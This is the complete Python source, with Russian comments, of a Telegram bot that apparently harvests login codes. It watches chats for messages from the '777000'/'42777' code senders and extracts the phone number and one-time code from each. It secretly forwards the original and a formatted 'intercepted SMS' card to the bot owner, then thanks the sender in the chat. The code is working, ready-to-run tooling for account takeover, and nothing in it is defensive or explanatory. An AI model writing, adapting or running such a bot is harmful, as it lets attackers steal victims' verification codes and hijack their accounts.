import os
import asyncio
import logging
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup

# ================= НАСТРОЙКИ =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "0"))

if not BOT_TOKEN or OWNER_ID == 0:
    logging.error("❌ Ошибка: Не заданы BOT_TOKEN или OWNER_ID")
    exit(1)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# ================= ПАРСЕРЫ =================
def extract_phone(text: str) -> str | None:
    if not text: return None
    match = re.search(r'(\+?\d{10,15})', text.replace(' ', '').replace('-', '').replace('(', '').replace(')', ''))
    return match.group(1) if match else None

def extract_code(text: str) -> str | None:
    if not text: return None
    cleaned = re.sub(r'\+?\d{10,15}', '', text)
    match = re.search(r'\b(\d{4,6})\b', cleaned)
    return match.group(1) if match else None

# ================= ФИЛЬТР =================
def is_sms_gateway(message: types.Message) -> bool:
    if not message.text:
        return False
    return "42777" in message.text or "777000" in message.text

# ================= КОМАНДЫ =================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.from_user.id == OWNER_ID:
        await message.answer("✅ Бот активен. Ожидаю SMS от шлюза 42777/777000.")

# ================= ОСНОВНОЙ ОБРАБОТЧИК =================
@dp.message(is_sms_gateway)
async def handle_sms(message: types.Message):
    logging.info(f"📨 Получено SMS от шлюза в чате {message.chat.id}")
    
    text = message.text or ""
    phone = extract_phone(text)
    code = extract_code(text)
    
    logging.info(f"🔑 Код: {code} | 📱 Номер: {phone}")

    # 1. Пересылаем оригинал владельцу (скрытая копия)
    try:
        await message.copy_to(chat_id=OWNER_ID)
        logging.info(f"✅ Оригинал переслан владельцу (ID: {OWNER_ID})")
    except Exception as e:
        logging.error(f"❌ Ошибка пересылки: {e}")

    # 2. Отправляем карточку с кодом владельцу
    summary_parts = ["📨 <b>Перехвачено SMS от шлюза:</b>"]
    if phone:
        summary_parts.append(f"📱 <b>Номер:</b> <code>{phone}</code>")
    if code:
        summary_parts.append(f"🔑 <b>Код:</b> <code>{code}</code>")
    summary_parts.append(f"📝 <b>Текст:</b> <i>{text[:200]}</i>")

    kb = None
    if code:
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"📋 Скопировать {code}", callback_data=f"copy:{code}")]
        ])

    try:
        await bot.send_message(
            OWNER_ID,
            "\n".join(summary_parts),
            parse_mode="HTML",
            reply_markup=kb
        )
        logging.info("✅ Карточка отправлена владельцу")
    except Exception as e:
        logging.error(f"❌ Ошибка отправки карточки: {e}")

    # 3. Отвечаем в чате "Спасибо"
    try:
        await message.answer("Спасибо")
        logging.info("✅ Ответ 'Спасибо' отправлен в чат")
    except Exception as e:
        logging.error(f"❌ Ошибка ответа в чате: {e}")

# ================= КНОПКА КОПИРОВАНИЯ =================
@dp.callback_query(F.data.startswith("copy:"))
async def copy_code_handler(callback: types.CallbackQuery):
    if callback.from_user.id != OWNER_ID:
        await callback.answer("⛔", show_alert=True)
        return
    code = callback.data.split(":", 1)[1]
    await callback.message.answer(f"<code>{code}</code>", parse_mode="HTML")
    await callback.answer("Скопировано!")

# ================= ЗАПУСК =================
async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    logging.info("✅ Бот запущен")
    logging.info(f"📋 OWNER_ID: {OWNER_ID}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logging.info("Бот остановлен")
